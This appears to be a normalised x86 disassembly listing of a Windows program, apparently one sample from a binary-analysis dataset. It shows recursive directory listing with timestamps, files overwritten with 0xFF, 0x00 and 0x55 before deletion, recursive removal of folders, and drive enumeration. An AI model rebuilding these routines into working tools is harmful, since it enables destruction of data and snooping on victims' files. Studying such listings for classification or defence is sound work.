jmp r-xdata
call sub_405240
pop ecx
push [ rw-data ]
call strlen
cmp [ ebp + 0x8 ] 0x0
pop ecx
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
leave
retn
push [ ebp + 0x8 ]
call free
pop ecx
sub_4037fd
push ebp
mov ebp esp
sub esp 0x3d0
push ebx
push esi
push edi
lea eax [ ebp - 0x3d0 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
push [ ebp + 0x8 ]
call _strdup
mov ebx eax
push 0x5c
push ebx
mov [ ebp - 0x8 ] ebx
call strrchr
add esp 0x18
mov edi eax
lea eax [ ebp - 0x164 ]
and [ edi ] 0x0
push eax
lea eax [ ebp - 0x3d0 ]
inc edi
push eax
mov [ ebp - 0x24 ] edi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
push ebx
lea eax [ ebp - 0x3d0 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x164 ]
push eax
lea eax [ ebp - 0x3d0 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
lea eax [ ebp - 0x3d0 ]
push eax
lea eax [ ebp - 0x2cc ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2cc ]
push eax
call sub_405240
add esp 0x10
inc [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x150 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test [ ebp - 0x164 ] 0x10
mov ebx rw-data
mov edi rw-data
mov esi rw-data
jne r-xdata
test ebx ebx
je r-xdata
mov esi rw-data
lea eax [ ebp - 0x164 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
xor eax eax
cmp [ rw-data ] 0x3e8
setle al
push ebx
call free
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x138 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
lea eax [ ebp - 0x2cc ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2cc ]
push eax
call sub_405240
mov ebx [ ebp - 0x8 ]
mov edi [ ebp - 0x24 ]
add esp 0xc
inc [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x150 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test [ ebp - 0x164 ] 0x10
jne r-xdata
lea eax [ ebp - 0x138 ]
push eax
movzx eax [ ebp - 0xe ]
push [ ebp - 0x144 ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x2cc ]
push ebx
push eax
call sprintf
lea eax [ ebp - 0x2cc ]
push eax
call sub_405240
lea eax [ ebp - 0x138 ]
inc [ rw-data ]
push eax
lea eax [ ebp - 0x2cc ]
push [ ebp - 0x8 ]
push edi
push eax
call sprintf
lea eax [ ebp - 0x2cc ]
push eax
call sub_408003
push 0x6
push esi
push eax
mov [ ebp + 0x8 ] eax
call strncmp
add esp 0x48
test eax eax
jne r-xdata
test [ ebp - 0x164 ] 0x10
je r-xdata
lea eax [ ebp - 0x138 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x3a98
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x138 ]
push edi
push eax
push ebx
lea eax [ ebp - 0x2cc ]
push esi
push eax
call sprintf
add esp 0x14
cmp [ rw-data ] 0x3a98
jge r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
mov eax [ rw-data ]
lea ecx [ ebp - 0x2cc ]
imul eax eax 0x208
add eax rw-data
inc [ rw-data ]
push ecx
push eax
call strcpy
pop ecx
pop ecx
push 0x2
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
call free
pop ecx
pop edi
pop esi
pop ebx
leave
retn
sub_403af3
push ebp
mov ebp esp
sub esp 0x168
push ebx
push esi
mov esi 0x80
push edi
push esi
call malloc
xor ebx ebx
push esi
push ebx
push eax
mov [ rw-data ] eax
call memset
mov eax [ ebp + 0x8 ]
add esp 0x10
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp [ eax ] bl
je r-xdata
push [ rw-data ]
call _strdup
push eax
mov [ ebp + 0x8 ] eax
push rw-data
push eax
call sub_40c987
push eax
mov [ ebp + 0x8 ] eax
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push esi
call sub_403c20
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x168 ]
push eax
call sprintf
mov eax [ rw-data ]
add esp 0x10
imul eax eax 0x208
mov esi rw-data
lea ecx [ ebp - 0x168 ]
add eax esi
inc [ rw-data ]
push ecx
push eax
call strcpy
push [ ebp + 0x8 ]
lea eax [ ebp - 0x168 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x168 ]
push eax
call sub_405240
add esp 0x18
inc [ rw-data ]
xor edi edi
cmp [ rw-data ] ebx
jle r-xdata
call sub_405240
cmp [ ebp + 0x8 ] ebx
pop ecx
pop edi
pop esi
pop ebx
je r-xdata
cmp edi [ rw-data ]
jl r-xdata
push 0x1
call _sleep
inc edi
add esi 0x208
cmp edi [ rw-data ]
pop ecx
jl r-xdata
push [ rw-data ]
call strlen
mov [ rw-data ] eax
mov eax [ rw-data ]
pop ecx
leave
retn
push [ ebp + 0x8 ]
call free
pop ecx
push rw-data
sub_403c20
push ebp
mov ebp esp
sub esp 0x3cc
push ebx
push esi
push edi
lea eax [ ebp - 0x3cc ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
push [ ebp + 0x8 ]
call _strdup
mov ebx eax
push 0x5c
push ebx
mov [ ebp - 0x14 ] ebx
call strrchr
mov esi [ FindFirstFileA@IAT ]
add esp 0x18
mov edi eax
lea eax [ ebp - 0x160 ]
push eax
lea eax [ ebp - 0x3cc ]
and [ edi ] 0x0
inc edi
push eax
mov [ ebp - 0x18 ] edi
call esi
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
lea eax [ ebp - 0x3cc ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x160 ]
push eax
lea eax [ ebp - 0x3cc ]
push eax
call esi
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x3cc ]
push eax
lea eax [ ebp - 0x2c8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c8 ]
push eax
call sub_405240
mov edi [ FileTimeToLocalFileTime@IAT ]
add esp 0x10
inc [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14c ]
push eax
call edi
mov ebx [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ebx
test [ ebp - 0x160 ] 0x10
jne r-xdata
test ebx ebx
je r-xdata
mov esi rw-data
lea eax [ ebp - 0x160 ]
push eax
push [ ebp + 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x134 ]
push eax
movzx eax [ ebp - 0x6 ]
push [ ebp - 0x140 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x2c8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c8 ]
push eax
call sub_405240
add esp 0x28
inc [ rw-data ]
xor eax eax
cmp [ rw-data ] 0x3e8
pop edi
pop esi
setle al
pop ebx
leave
retn
push ebx
call free
pop ecx
lea eax [ ebp - 0x160 ]
push eax
push [ ebp + 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x134 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ FindClose@IAT ]
lea eax [ ebp - 0x2c8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c8 ]
push eax
call sub_405240
mov ebx [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
add esp 0xc
inc [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14c ]
push eax
call edi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ebx
test [ ebp - 0x160 ] 0x10
jne r-xdata
test [ ebp - 0x160 ] 0x10
je r-xdata
lea eax [ ebp - 0x134 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x3a98
jge r-xdata
lea eax [ ebp - 0x134 ]
push edi
push eax
push ebx
lea eax [ ebp - 0x2c8 ]
push esi
push eax
call sprintf
add esp 0x14
cmp [ rw-data ] 0x3a98
jge r-xdata
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ ebp - 0x2c8 ]
imul eax eax 0x208
add eax rw-data
inc [ rw-data ]
push ecx
push eax
call strcpy
pop ecx
pop ecx
sub_403e90
push ebp
mov ebp esp
sub esp 0x170
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_40c987
pop ecx
mov ebx eax
push ebx
mov [ ebp - 0x4 ] ebx
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
push ebx
push rw-data
push 0x80
push [ ebp + 0x8 ]
call [ SetFileAttributesA@IAT ]
push rw-data
push ebx
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x170 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call free
pop ecx
push ebx
push rw-data
jmp r-xdata
push [ esi + 0x10 ]
call _filelength
push esi
mov edi eax
call fclose
pop ecx
test edi edi
pop ecx
jle r-xdata
lea eax [ ebp - 0x170 ]
push eax
call sprintf
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push ebx
call [ DeleteFileA@IAT ]
test eax eax
push ebx
je r-xdata
push edi
call malloc
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push edi
push rw-data
jmp r-xdata
mov esi rw-data
push esi
push [ ebp - 0x4 ]
call fopen
pop ecx
mov [ ebp + 0x8 ] eax
test eax eax
pop ecx
je r-xdata
push esi
push [ ebp - 0x4 ]
call fopen
pop ecx
mov [ ebp + 0x8 ] eax
test eax eax
pop ecx
je r-xdata
push edi
push 0xff
push ebx
call memset
push [ ebp + 0x8 ]
push edi
push 0x1
push ebx
call fwrite
push [ ebp + 0x8 ]
call fflush
push [ ebp + 0x8 ]
call fclose
add esp 0x24
mov [ ebp - 0x8 ] 0x1
push esi
push [ ebp - 0x4 ]
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push edi
push 0x0
push ebx
call memset
push [ ebp + 0x8 ]
push edi
push 0x1
push ebx
call fwrite
push [ ebp + 0x8 ]
call fflush
push [ ebp + 0x8 ]
call fclose
add esp 0x24
mov [ ebp - 0x8 ] 0x1
push ebx
call free
cmp [ ebp - 0x8 ] 0x1
pop ecx
push [ ebp - 0x4 ]
jne r-xdata
push edi
push 0x55
push ebx
call memset
push esi
push edi
push 0x1
pop edi
push edi
push ebx
call fwrite
push esi
call fflush
push esi
call fclose
add esp 0x24
mov [ ebp - 0x8 ] edi
push rw-data
jmp r-xdata
call [ DeleteFileA@IAT ]
push [ ebp - 0x4 ]
test eax eax
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
sub_404071
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ esp + 0x10 ]
push edi
call strlen
mov ebx eax
push ebx
push edi
call sub_40267e
push ebx
push edi
call sub_40c768
push rw-data
push rw-data
mov [ rw-data ] eax
call fopen
mov edi eax
add esp 0x1c
test edi edi
je r-xdata
push rw-data
mov [ rw-data ] esi
call _strdup
mov edi eax
push edi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
push [ rw-data ]
push rw-data
push edi
call fprintf
push edi
call fclose
push rw-data
call _strdup
mov edi eax
push edi
call strlen
add esp 0x18
mov [ rw-data ] eax
test esi esi
mov [ rw-data ] 0x2
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
push esi
call free
pop ecx
jmp r-xdata
sub_40411e
push ebp
mov ebp esp
sub esp 0x400
push esi
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x400 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x24
mov [ rw-data ] eax
mov eax esi
pop esi
leave
retn
sub_404213
push ebp
mov ebp esp
sub esp 0x204
push esi
xor esi esi
cmp [ rw-data ] 0xc8
je r-xdata
push eax
call free
pop ecx
mov eax [ rw-data ]
mov esi rw-data
imul eax eax 0x104
push ebx
mov ebx [ PathFileExistsA@IAT ]
add eax esi
push edi
push eax
call ebx
test eax eax
je r-xdata
inc esi
cmp esi 0x3
jl r-xdata
mov edi [ ebp + 0xc ]
imul edi edi 0x104
lea esi [ edi + rw-data ]
push esi
call ebx
test eax eax
mov ebx rw-data
jne r-xdata
mov eax [ rw-data ]
imul eax eax 0x104
add eax esi
push eax
call [ DeleteFileA@IAT ]
push 0x1
push [ rw-data ]
push [ ebp + 0x8 ]
push 0x0
push rw-data
call sub_402b19
add esp 0x14
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx eax
shl ecx 0x6
add ecx rw-data
push ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x204 ]
push eax
call _strdup
add esp 0x18
mov eax [ ebp + 0xc ]
mov esi rw-data
shl eax 0x6
lea eax [ eax + rw-data ]
mov [ ebp - 0x4 ] eax
push eax
lea eax [ ebp - 0x204 ]
push esi
push eax
call sprintf
push [ ebp + 0x8 ]
push esi
push [ ebp - 0x4 ]
call sprintf
push [ ebp + 0x8 ]
call strlen
push eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_40267e
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40c768
lea edi [ edi + rw-data ]
push ebx
push edi
mov [ ebp - 0x4 ] eax
call fopen
mov ebx eax
add esp 0x34
test ebx ebx
je r-xdata
push ebx
push esi
call fopen
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push esi
push ebx
call fprintf
push ebx
call fclose
push rw-data
call _strdup
mov ecx [ ebp + 0xc ]
add esp 0x14
mov [ rw-data ] 0x2
mov [ rw-data ] ecx
jmp r-xdata
push eax
call fclose
pop ecx
push edi
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x204 ]
push eax
call _strdup
add esp 0x14
push [ ebp - 0x4 ]
call free
pop ecx
pop edi
pop ebx
jmp r-xdata
pop esi
leave
retn
sub_4043c4
mov eax [ rw-data ]
push esi
imul eax eax 0x104
push edi
mov edi rw-data
add eax edi
push eax
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
movsx esi [ eax ]
sub esi 0x30
js r-xdata
mov eax [ rw-data ]
imul eax eax 0x104
add eax edi
push eax
call [ DeleteFileA@IAT ]
push rw-data
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
mov [ rw-data ] 0x2
pop esi
retn
cmp esi [ rw-data ]
jge r-xdata
mov eax esi
push rw-data
imul eax eax 0x104
add eax edi
push eax
call fopen
pop ecx
test eax eax
pop ecx
je r-xdata
push eax
call fclose
pop ecx
mov [ rw-data ] esi
sub_40445b
cmp [ rw-data ] 0x6
push esi
jb r-xdata
push [ esp + 0x8 ]
call sub_40a4f0
push rw-data
call _strdup
jmp r-xdata
pop ecx
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_40448d
cmp [ rw-data ] 0x6
push esi
jb r-xdata
push [ esp + 0x8 ]
call sub_4098c6
push rw-data
call _strdup
jmp r-xdata
pop ecx
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_4044bf
cmp [ rw-data ] 0x6
push esi
jb r-xdata
push [ esp + 0x8 ]
call sub_40ad9f
push rw-data
call _strdup
jmp r-xdata
pop ecx
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_4044f1
cmp [ rw-data ] 0x6
push esi
jb r-xdata
push [ esp + 0x8 ]
call sub_40a9bc
push rw-data
call _strdup
jmp r-xdata
pop ecx
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_404523
cmp [ rw-data ] 0x6
push esi
jb r-xdata
push [ esp + 0x8 ]
call sub_40b404
push rw-data
call _strdup
jmp r-xdata
pop ecx
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_404555
cmp [ rw-data ] 0x6
push esi
jb r-xdata
push 0x1
pop eax
cmp [ rw-data ] eax
jne r-xdata
push rw-data
jmp r-xdata
mov [ rw-data ] eax
push rw-data
push rw-data
jmp r-xdata
call _strdup
pop ecx
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_40459a
cmp [ rw-data ] 0x6
push esi
jb r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push rw-data
jmp r-xdata
and [ rw-data ] 0x0
push rw-data
push rw-data
jmp r-xdata
call _strdup
pop ecx
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_4045df
push ebp
mov ebp esp
sub esp 0x990
push ebx
push esi
push edi
push 0x2f
pop ecx
mov esi rw-data
lea edi [ ebp - 0x388 ]
push 0x2f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x2c8 ]
lea eax [ ebp - 0x88c ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi 0x104
push esi
push eax
call [ GetSystemDirectoryA@IAT ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x6
jb r-xdata
push rw-data
lea eax [ ebp - 0x88c ]
push eax
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call fopen
add esp 0x14
test eax eax
jne r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x788 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
push eax
call fclose
pop ecx
lea eax [ ebp - 0x990 ]
push eax
push esi
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x990 ]
push eax
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call sprintf
mov esi rw-data
lea eax [ ebp - 0x104 ]
push esi
push eax
call fopen
mov ebx eax
add esp 0x14
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
push rw-data
lea eax [ ebp - 0x788 ]
push eax
call sprintf
lea eax [ ebp - 0x388 ]
mov edi rw-data
push eax
push edi
push ebx
call fprintf
push ebx
call fclose
lea eax [ ebp - 0x788 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x104 ]
push eax
call sub_40874c
mov ebx eax
add esp 0x1c
test ebx ebx
je r-xdata
lea eax [ ebp - 0x104 ]
push eax
push rw-data
jmp r-xdata
push 0x8
push ebx
push rw-data
call strncmp
add esp 0xc
test eax eax
push ebx
jne r-xdata
lea eax [ ebp - 0x788 ]
push eax
call sprintf
add esp 0xc
jmp r-xdata
call free
mov ebx [ DeleteFileA@IAT ]
pop ecx
lea eax [ ebp - 0x104 ]
push eax
call ebx
lea eax [ ebp - 0x104 ]
push esi
push eax
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
jne r-xdata
lea eax [ ebp - 0x788 ]
push eax
call strcat
push ebx
call free
add esp 0xc
lea eax [ ebp - 0x104 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x2c8 ]
push eax
push edi
push esi
call fprintf
push esi
call fclose
lea eax [ ebp - 0x788 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x104 ]
push eax
call sub_40874c
mov esi eax
add esp 0x1c
test esi esi
je r-xdata
lea eax [ ebp - 0x788 ]
push rw-data
push eax
call strcat
jmp r-xdata
push 0x8
push esi
push rw-data
call strncmp
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ecx
jmp r-xdata
push esi
call free
pop ecx
lea eax [ ebp - 0x104 ]
push eax
call ebx
lea eax [ ebp - 0x788 ]
push esi
push eax
call strcat
pop ecx
pop ecx
sub_404841
push ebp
mov ebp esp
sub esp 0x474
push ebx
push esi
push edi
mov edi 0x104
lea eax [ ebp - 0x104 ]
push edi
push eax
call [ GetSystemDirectoryA@IAT ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x6
jb r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call fopen
mov ebx eax
add esp 0x14
test ebx ebx
jne r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x474 ]
push eax
call _strdup
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x474 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x474 ]
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp + esi - 0x104 ] 0x0
push ebx
call fclose
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x30c ]
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x30c ]
push edi
push eax
call [ DoEnvironmentSubstA@IAT ]
lea eax [ ebp - 0x30c ]
push eax
call sub_405bd7
mov [ ebp + esi - 0x104 ] al
inc esi
cmp esi edi
jl r-xdata
push ebx
call fgetwc
movzx eax ax
cmp eax 0xffff
pop ecx
je r-xdata
sub_40495c
push ebp
mov ebp esp
sub esp 0x350
push edi
push 0x168
call malloc
mov edi eax
pop ecx
test edi edi
mov [ ebp - 0x4 ] edi
jne r-xdata
push ebx
push esi
push [ ebp + 0x8 ]
call sub_40c987
mov esi eax
push esi
mov [ ebp - 0x8 ] esi
call _strdup
mov ebx eax
push ebx
call strlen
add esp 0xc
push 0x1
call exit
and [ eax + ebx ] 0x0
push esi
push rw-data
push edi
call sprintf
add esp 0xc
lea eax [ ebp - 0x350 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ eax + ebx ] 0x5c
jne r-xdata
push esi
push rw-data
push edi
call sprintf
add esp 0xc
lea eax [ ebp - 0x324 ]
mov esi rw-data
push eax
push ebx
lea eax [ ebp - 0x10c ]
push esi
push eax
call sprintf
mov edi [ GetLastError@IAT ]
add esp 0x10
cmp [ ebp - 0x324 ] 0x2e
je r-xdata
dec eax
js r-xdata
test edi edi
je r-xdata
push esi
call free
pop ecx
lea eax [ ebp - 0x350 ]
push eax
push [ ebp + 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
test [ ebp - 0x350 ] 0x10
je r-xdata
mov eax ebx
pop esi
pop ebx
pop edi
leave
retn
push edi
call free
pop ecx
push [ ebp + 0x8 ]
call [ FindClose@IAT ]
push rw-data
push [ ebp - 0x4 ]
call strcat
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x324 ]
push eax
push ebx
lea eax [ ebp - 0x10c ]
push esi
push eax
call sprintf
add esp 0x10
cmp [ ebp - 0x324 ] 0x2e
je r-xdata
lea eax [ ebp - 0x10c ]
push 0x80
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x10c ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
call [ RemoveDirectoryA@IAT ]
test eax eax
je r-xdata
push edi
call _strdup
mov ebx eax
push ebx
call strlen
pop ecx
mov [ rw-data ] eax
test esi esi
pop ecx
je r-xdata
push [ ebp - 0x4 ]
call _msize
add eax 0x169
push eax
push [ ebp - 0x4 ]
call realloc
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
call edi
push eax
lea eax [ ebp - 0x10c ]
push eax
push rw-data
lea eax [ ebp - 0x10c ]
push eax
push rw-data
jmp r-xdata
call edi
push eax
lea eax [ ebp - 0x10c ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
push rw-data
lea eax [ ebp - 0x210 ]
push eax
call sprintf
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x210 ]
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x210 ]
push eax
push [ ebp - 0x4 ]
call strcat
pop ecx
pop ecx
sub_404b66
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi 0x80
push edi
push esi
call malloc
push esi
push 0x0
push eax
mov [ rw-data ] eax
call memset
add esp 0x10
push 0x43
pop esi
push 0x18
pop edi
inc esi
dec edi
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_404c0d
pop ecx
pop ecx
push esi
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call [ GetDriveTypeA@IAT ]
cmp eax 0x3
jne r-xdata
push rw-data
call sub_405240
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
push rw-data
call _strdup
pop ecx
mov esi eax
push eax
call _strdup
push [ rw-data ]
mov esi eax
call free
pop ecx
pop ecx
jmp r-xdata
push esi
call strlen
pop ecx
mov [ rw-data ] eax
mov eax esi
pop edi
pop esi
leave
retn
sub_404c0d
and [ rw-data ] 0x0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
call strlen
push eax
mov eax [ rw-data ]
imul eax eax 0x208
mov ebx rw-data
push edi
add eax ebx
push eax
call strncpy
mov esi [ rw-data ]
push edi
imul esi esi 0x208
call strlen
and [ eax + esi + rw-data ] 0x0
inc [ rw-data ]
lea eax [ esi + rw-data ]
push edi
push eax
call strcpy
xor esi esi
add esp 0x1c
cmp [ rw-data ] esi
mov edi 0x208
jle r-xdata
xor esi esi
cmp [ rw-data ] esi
jle r-xdata
push ebp
mov ebp ebx
pop edi
pop esi
xor eax eax
pop ebx
retn
push [ esp + 0x14 ]
push ebx
call sub_404ed3
inc esi
pop ecx
add ebx edi
cmp esi [ rw-data ]
pop ecx
jl r-xdata
push [ esp + 0x18 ]
push ebp
call sub_404cbc
inc esi
pop ecx
add ebp edi
cmp esi [ rw-data ]
pop ecx
jl r-xdata
pop ebp
sub_404cbc
push ebp
mov ebp esp
sub esp 0x3c8
push esi
push edi
push [ ebp + 0x8 ]
call _strdup
mov edi eax
pop ecx
mov [ ebp - 0x4 ] edi
cmp [ edi ] 0x0
je r-xdata
cmp [ eax - 0x1 ] 0x5c
push edi
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
mov edi [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0xc ]
push ebx
push eax
lea eax [ ebp - 0x148 ]
push eax
call edi
mov ebx [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0xc ]
push eax
call ebx
test [ ebp - 0x15c ] 0x10
je r-xdata
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x3c8 ]
push eax
call sprintf
mov esi [ FindFirstFileA@IAT ]
add esp 0xc
lea eax [ ebp - 0x15c ]
push eax
lea eax [ ebp - 0x3c8 ]
push eax
call esi
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x15c ]
push eax
push [ ebp + 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x130 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
pop edi
xor eax eax
pop esi
leave
retn
